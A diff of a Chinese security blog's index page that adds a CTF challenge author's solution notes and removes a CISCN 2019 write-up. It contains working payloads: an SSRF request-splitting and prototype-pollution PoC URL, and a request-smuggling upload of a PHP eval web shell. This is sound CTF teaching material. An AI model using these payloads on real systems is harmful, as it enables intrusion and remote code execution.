@@ -90,6 +90,94 @@
     
         <article class="post">
             <h1>
+                <a class="title" href="/2019/12/01/I-SOON2019-Membershop出题思路/"> 
+                    I-SOON2019-Membershop出题思路 
+                </a>
+            </h1>
+                        <div class="meta">
+                <a class="date"> 
+                    <i class="fa fa-calendar" aria-hidden="true"></i>                    
+                    2019-12-01   
+                </a>
+                
+                
+                
+                <a class="tag">
+                    <i class="fa fa-tags" aria-hidden="true"></i>  
+                </a>
+                
+                    <ul class="tag-list"><li class="tag-list-item"><a class="tag-list-link" href="/tags/小组-学校/">小组/学校</a></li></ul>
+            </div>
+            <div class="content">
+                
+                <h1 id="写在前面"><a href="#写在前面" class="headerlink" title="写在前面"></a>写在前面</h1><p>今年是第二年出题，鉴于去年题目过于简单(去年我是真的sb且敷衍)，今年题目我憋了蛮长时间的(狗日的前端)，本希望做到这题的师傅们能有所收获。但是比赛跟各位师傅的时间还是冲突了，加之校赛的局限，实际也没多少人在打。比赛当天下午，Membershop容器的峰值也就5、6个的样子。其实题目并不是很难。</p>
+<p>虽然最后没能达到自己预期的做题效果，算是有点点失望吧。但是我相信D0g3一定能把比赛办出去，感谢运维小哥@0akarma跟我一起调试动态容器的bug，关于全部的题目环境在:<a href="http://dao.ge/isoon2019" target="_blank" rel="noopener">http://dao.ge/isoon2019</a></p>
+<h1 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h1><p>题目开源地址:<a href="https://github.com/Hpd0ger/My_ctf_challenge/" target="_blank" rel="noopener">https://github.com/Hpd0ger/My_ctf_challenge/</a></p>
+<p>修改index.js的server_ip为环境的ip</p>
+<pre><code>docker-compose build
+docker-compose up -d</code></pre><h1 id="解题步骤"><a href="#解题步骤" class="headerlink" title="解题步骤"></a>解题步骤</h1><p>登陆的时候过滤了admin，同时发现小写字符转换成了大写字母显示。结合set-cookie是koa的框架，很容易联想到后端使用<code>toUpperCase()</code>做转换，拉丁文越权登陆<code>admın</code></p>
+<p><img src="http://static.zybuluo.com/1160307775/uevaveqvu1j6y2trkxfhf08u/image_1dr12lu22vs4iq44id1vuas21m.png" alt="image_1dr12lu22vs4iq44id1vuas21m.png-38.1kB"></p>
+<p>登陆成功之后多了一个请求记录的功能，同时登陆成功后给出源码的地址</p>
+<p><img src="http://static.zybuluo.com/1160307775/vmsnv0pzmurxdz2amugpr9br/image_1dr12phlo1hc31vqi17fvahuhgr16.png" alt="image_1dr12phlo1hc31vqi17fvahuhgr16.png-48.1kB"></p>
+<p>拿到源码后简单看登陆逻辑<br><img src="http://static.zybuluo.com/1160307775/w044ik52f2r0v4qy9dztwfc2/image_1dmbk6vlo19d413cc13h8b108q913.png" alt="image_1dmbk6vlo19d413cc13h8b108q913.png-57.7kB"></p>
+<p>逻辑根据传入的用户名<code>userName</code>会在登陆前经过一次检测<br><img src="http://static.zybuluo.com/1160307775/1sn9fw27548pjpjy0yfishg4/image_1dmbk45jltj28kro9c1kjdkshm.png" alt="image_1dmbk45jltj28kro9c1kjdkshm.png-65.8kB"></p>
+<p>当传入的用户名包含<code>admin</code>时，则自动循环replace掉。在登陆成功的同时会把<code>username</code>写进session里，这里可以看到只有我们登陆了<code>admin</code>才有权限加载其他模版<br><img src="http://static.zybuluo.com/1160307775/8rvxorv0r9e3u03r6vjzyo2u/image_1dmbkcg89ijlmd61vef209bti1g.png" alt="image_1dmbkcg89ijlmd61vef209bti1g.png-160.3kB"></p>
+<p>漏洞点在代码76-117行，它只允许请求以<code>http://127.0.0.1:3000/query</code>(后面拉到本地环境会改127.0.0.1这个地址，这是我本地debug)开头的url。输入其他开头的url会被<code>error url</code>，而且不存在任何host的绕过。当请求之后会被记录在sandbox的results.txt里面并且支持追加，sandbox根据ip建立<br><img src="http://static.zybuluo.com/1160307775/1fkgcdl7j1qc7v6dcjf6tdxm/image_1dmbkrtpt1pkv1q561o9kf2p10hj2n.png" alt="image_1dmbkrtpt1pkv1q561o9kf2p10hj2n.png-28.9kB"><br><img src="http://static.zybuluo.com/1160307775/sl6ii6qt9zm6mj7jrfhsetsp/image_1dmbku3fk399n211cvq49r1emt34.png" alt="image_1dmbku3fk399n211cvq49r1emt34.png-33.7kB"></p>
+<p>因为query也是一个路由，那么这里就存在一个ssrf。如何bypass去请求其他路由呢？只需要用unicode编码并且分割http包，例如</p>
+<pre><code>http://127.0.0.1:3000/query?param=1\u{0120}HTTP/1.1\u{010D}\u{010A}Host:\u{0120}127.0.0.1:3000\u{010D}\u{010A}Connection:\u{0120}keep-alive\u{010D}\u{010A}\u{010D}\u{010A}GET\u{0120}/\u{0173}\u{0161}\u{0176}\u{0165}</code></pre><p>url编码是16进制，\u{01xx}在http.get的时候不会进行percent encode，但是在buffer写入的时候会把xx解码。其中<code>\u{0173}\u{0161}\u{0176}\u{0165}</code>代表的是<code>save</code>，73617665是<code>save</code>的16进制表示。具体原理可以看:<a href="https://www.4hou.com/vulnerable/13637.html" target="_blank" rel="noopener">通过拆分请求来实现的SSRF攻击</a></p>
+<p>接着就寻找一下其他路由存在的问题，可利用点在<code>/save</code></p>
+<pre><code>home.get(&#39;/save&#39;,async(ctx)=&gt;{
+    let ip = ctx.request.ip;
+    let reqbody = {switch:false}
+    reqbody = qs.parse(ctx.querystring,{allowPrototypes: false});
+
+    if (ip.substr(0, 7) == &quot;::ffff:&quot;) {
+        ip = ip.substr(7);
+    }
+    if (ip !== &#39;127.0.0.1&#39; &amp;&amp; ip !== server_ip) {
+        ctx.status = 403;
+        ctx.response.body = &#39;403: You are not the local user&#39;;
+    }else {
+        if(reqbody.switch === true &amp;&amp; reqbody.sandbox &amp;&amp; reqbody.opath &amp;&amp;fs.existsSync(reqbody.spath)){
+            if(fs.existsSync(reqbody.sandbox)){
+                paths.opath = fs.readdirSync(reqbody.sandbox)[0];
+            }else if(fs.existsSync(reqbody.opath)){
+                let buffer;
+                tmp[reqbody.sandbox][&#39;opath&#39;] = reqbody.opath;
+                if(/[flag]/.test(tmp[reqbody.sandbox][&#39;opath&#39;])){
+                    buffer = tmp[reqbody.sandbox][&#39;opath&#39;].replace(/f|l|a|g/g,&#39;&#39;);
+                }else{
+                    buffer = reqbody.opath;
+                }
+            }
+            let opath = paths.opath? paths.opath : buffer;
+            let text = fs.readFileSync(opath, &#39;utf8&#39;);
+            await WriteResults(reqbody.spath,text);
+
+        }else{
+            return false;
+        }
+    }
+})</code></pre><p>这里大致有两个障碍点：</p>
+<p>1、限制了本地127.0.0.1访问<br>-&gt;ssrf解决</p>
+<p>2、通过qs包解析url参数存为对象，switch默认为flase，配置<code>allowPrototypes=false</code>，直接传递http参数不能覆盖switch。qs.parse() bypass for prototype pollution@qs&lt;6.3，参考链接:<a href="https://snyk.io/vuln/npm:qs:20170213" target="_blank" rel="noopener">Prototype Override Protection Bypass</a>，传参:<code>]=switch</code>绕过</p>
+<p>3、解析获得的对象需要三个参数sandbox、opath、spath。代码逻辑就是如果存在sandbox那么就取sandbox下的第一个文件(即results.txt)读取后写入spath，否则读取自定义的opath，将结果写入spath(两者前提都是spath必须存在且可写，只有sandbox/result.txt满足要求)。但是自定义opath会替换所有的[flag]字段，不允许直接读flag。</p>
+<p>这里存在判断的绕过。原型链污染sandbox下的一个文件为/flag，再去自定义读到spath里</p>
+<pre><code>tmp[&#39;__proto__&#39;][&#39;opath&#39;] = &#39;/flag&#39;;
+=&gt;
+paths.opath = /flag</code></pre><p>构造一下就能把flag追加写入到sandbox/results.txt。poc如下，调整一下opath为flag地址，sandbox为自己的<code>md5(ip)</code>就行了：</p>
+<pre><code>encodeURI(&quot;http://127.0.0.1:3000/query?param=1\u{0120}HTTP/1.1\u{010D}\u{010A}Host:\u{0120}127.0.0.1:3000\u{010D}\u{010A}Connection:\u{0120}keep-alive\u{010D}\u{010A}\u{010D}\u{010A}GET\u{0120}/\u{0173}\u{0161}\u{0176}\u{0165}?]=switch&amp;sandbox=__proto__&amp;opath=/flag&amp;spath=tmp/ab54a5cf83f67d827ecba68e394f9196&quot;)</code></pre>
+                
+            </div>
+            <div class="continue">
+            <a href="/2019/12/01/I-SOON2019-Membershop出题思路/">
+            Continue            <i class="fa fa-angle-right" aria-hidden="true"></i>
+            </a>
+            </div>
+        </article>
+        
+        <article class="post">
+            <h1>
                 <a class="title" href="/2019/11/20/从Kibana-RCE对nodejs子进程创建的思考/"> 
                     从Kibana-RCE对nodejs子进程创建的思考 
                 </a>
@@ -1644,83 +1732,6 @@ launch</code></pre><p><img src="http://static.zybuluo.com/1160307775/uefh1iezrvi
             </div>
             <div class="continue">
             <a href="/2019/08/06/De1CTF-Giftbox题解/">
-            Continue            <i class="fa fa-angle-right" aria-hidden="true"></i>
-            </a>
-            </div>
-        </article>
-        
-        <article class="post">
-            <h1>
-                <a class="title" href="/2019/07/29/CISCN 2019 Final Web11复盘/"> 
-                    CISCN 2019 Final Web11题解 
-                </a>
-            </h1>
-                        <div class="meta">
-                <a class="date"> 
-                    <i class="fa fa-calendar" aria-hidden="true"></i>                    
-                    2019-07-29   
-                </a>
-                
-                
-                
-                <a class="tag">
-                    <i class="fa fa-tags" aria-hidden="true"></i>  
-                </a>
-                
-                    <ul class="tag-list"><li class="tag-list-item"><a class="tag-list-link" href="/tags/CTF/">CTF</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Web/">Web</a></li></ul>
-            </div>
-            <div class="content">
-                
-                <h1 id="CISCN-2019-Final-Web11复盘"><a href="#CISCN-2019-Final-Web11复盘" class="headerlink" title="CISCN 2019 Final Web11复盘"></a>CISCN 2019 Final Web11复盘</h1><p>题目本身结合了很多知识点，比赛没做出来，这里进行复盘分析。</p>
-<p>题目地址：<a href="http://web65.buuoj.cn/" target="_blank" rel="noopener">http://web65.buuoj.cn/</a><br>题目源码：<a href="https://github.com/imagemlt/CISCN_2019_final_pmarkdown.git" target="_blank" rel="noopener">https://github.com/imagemlt/CISCN_2019_final_pmarkdown.git</a></p>
-<h2 id="简述"><a href="#简述" class="headerlink" title="简述"></a>简述</h2><p>题目功能点很清晰：上传md文件、解析md文件为html(通过php拓展)</p>
-<p>在Posts目录存在的.htaccess文件，表明md以php解析，不难想思路就是上传md来getshell</p>
-<pre><code>AddType application/x-httpd-php .md</code></pre><p>但是上传是受到本地限制，也是这道题核心的考点。<br><img src="http://static.zybuluo.com/1160307775/tv820qzlzqhref82quabuss7/image_1dgtncrha8qnb4qjv51vlahbj26.png" alt="image_1dgtncrha8qnb4qjv51vlahbj26.png-120.9kB"></p>
-<h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><p>在分析post.php时发现函数pmark_include<br><img src="http://static.zybuluo.com/1160307775/ukd6lm5sgej2r6em6aiiu6co/image_1dgtnif22m4n18851r7irll15r42j.png" alt="image_1dgtnif22m4n18851r7irll15r42j.png-22.1kB"></p>
-<p>它的作用是解析md为html，但在php官方文档并没有找到这个函数，说明是做题人自己编译出来的。在readme.md中同样提示<code>pmarkdown基于pandoc的php解析markdown拓展</code></p>
-<p>当时猜测肯定是这个函数能进行类似于csrf/ssrf的操作，让服务端帮我们上传文件，后续放的提示也证明确实存在一个ssrf的点，只可惜网上基于pandoc的md解析几乎没有php手册。</p>
-<p>不过题目给出了编译后的so文件，那么只能分析opcode(垃圾web狗哭了)。</p>
-<h2 id="解题步骤"><a href="#解题步骤" class="headerlink" title="解题步骤"></a>解题步骤</h2><p>先是逆向so文件。由于是c编译而成，直接拖到ida用f5跟，麻烦pwn师傅教了我一手。下面大致讲一下调用栈，也可能有不对的地方望指正。</p>
-<p>看到sub_1850函数发起了本地请求，并且路径为path<br><img src="http://static.zybuluo.com/1160307775/bz59tutn4arpsk619ono03ml/image_1dgv2l7tc14839tceud1invijj30.png" alt="image_1dgv2l7tc14839tceud1invijj30.png-124.9kB"></p>
-<p>追踪哪里调用了sub_1850并且path的值从何获取，最终追到发起requests时会调用的回调函数<code>zm_activate_pmarkdown</code><br><img src="http://static.zybuluo.com/1160307775/82o977t6qv6vr4liz6jc4h36/image_1dgv3d6mh1e31eao1pk91moij973d.png" alt="image_1dgv3d6mh1e31eao1pk91moij973d.png-28.8kB"></p>
-<p>进行调用的语句如下，不难发现进行了一个对v16参数的判断<br><img src="http://static.zybuluo.com/1160307775/omm1bo25ugdkr1lrz04ioy09/image_1dgv3e7u2gt16cr1et2e8lu553q.png" alt="image_1dgv3e7u2gt16cr1et2e8lu553q.png-38.9kB"></p>
-<p>这里就涉及到知识盲区了，由于不会ida的动态调试，没有确定参数值，这里只能从writeup入手分析条件判断的含义。</p>
-<p>官方payload:</p>
-<pre><code>data=&#39;504f5354202f75706c6f61642e70687020485454502f312e310d0a486f73743a203132372e302e302e313a383038300d0a557365722d4167656e743a204d6f7a696c6c612f352e3020284d6163696e746f73683b20496e74656c204d6163204f5320582031302e31333b2072763a36362e3029204765636b6f2f32303130303130312046697265666f782f36362e300d0a4163636570743a20746578742f68746d6c2c6170706c69636174696f6e2f7868746d6c2b786d6c2c6170706c69636174696f6e2f786d6c3b713d302e392c2a2f2a3b713d302e380d0a4163636570742d4c616e67756167653a207a682c656e2d55533b713d302e372c656e3b713d302e330d0a526566657265723a20687474703a2f2f3132372e302e302e313a383038302f696e6465782e7068703f6163743d75706c6f61640d0a436f6e74656e742d547970653a206d756c7469706172742f666f726d2d646174613b20626f756e646172793d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d363639333633383838313437393532323633303632333639333739370d0a436f6e74656e742d4c656e6774683a203234340d0a436f6e6e656374696f6e3a20636c6f73650d0a557067726164652d496e7365637572652d52657175657374733a20310d0a0d0a2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d363639333633383838313437393532323633303632333639333739370d0a436f6e74656e742d446973706f736974696f6e3a20666f726d2d646174613b206e616d653d2266696c65223b2066696c656e616d653d226c6f676f75742e706870220d0a436f6e74656e742d547970653a20746578742f7068700d0a0d0a3c3f706870200d0a6576616c28245f524551554553545b615d293b0a0d0a2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d363639333633383838313437393532323633303632333639333739372d2d0d0a&#39;.replace(&#39;\n&#39;,&#39;&#39;)
-data=data.decode(&#39;hex&#39;)
-requests.post(url+&#39;/index.php&#39;,data={&#39;debug&#39;:&quot;sadfas HTTP/1.1\r\nHOST:localhost\r\nConnection:Keep-Alive\r\n\r\n%s\r\n&quot;%data},timeout=timeout)</code></pre><p>这样不难理解判断的核心即是否存在debug参数，并且对v16取了24位地址偏移后的值传入下一层函数，也就是之前要最终的形参path。</p>
-<p>在payload中的形式，相当于传递了两个http包，拼接后如下</p>
-<pre><code>POST whatever HTTP/1.1
-Host: localhost
-Connection: Keep-Alive
-
-POST /upload.php HTTP/1.1
-Host: 127.0.0.1:8080
-User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.13; rv:66.0) Gecko/20100101 Firefox/66.0
-Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
-Accept-Language: zh,en-US;q=0.7,en;q=0.3
-Referer: http://127.0.0.1:8080/index.php?act=upload
-Content-Type: multipart/form-data; boundary=---------------------------6693638881479522630623693797
-Content-Length: 244
-Connection: close
-Upgrade-Insecure-Requests: 1
-
------------------------------6693638881479522630623693797
-Content-Disposition: form-data; name=&quot;file&quot;; filename=&quot;shell&quot;
-Content-Type: text/php
-
-&lt;?php 
-eval($_REQUEST[a]);
-
------------------------------6693638881479522630623693797--</code></pre><p>此时就可以把两个http包带入之前的path，构造一个完整的http包请求。而服务端在发送http请求时，会对请求包逐一发送。即先请求了<code>whatever</code>，建立http连接，connection:keep-alive 保持http的连接不被中断。</p>
-<p>第二次请求data.decode(‘hex’)，让server帮我们请求Upload并上传md文件从而getshell</p>
-<h2 id="后续"><a href="#后续" class="headerlink" title="后续"></a>后续</h2><p>传了md就能解析php来getshell，只不过是要饶一个disable_function，预期解使用ld_preload去改变环境变量来bypass。不过有师傅提醒df过滤不全用popen也可以执行命令。</p>
-<p>逆向功底太差了，有机会可以去抓个包分析一下debug参数的请求流程，最后膜出题师傅的知识渊博</p>
-
-                
-            </div>
-            <div class="continue">
-            <a href="/2019/07/29/CISCN 2019 Final Web11复盘/">
             Continue            <i class="fa fa-angle-right" aria-hidden="true"></i>
             </a>
             </div>
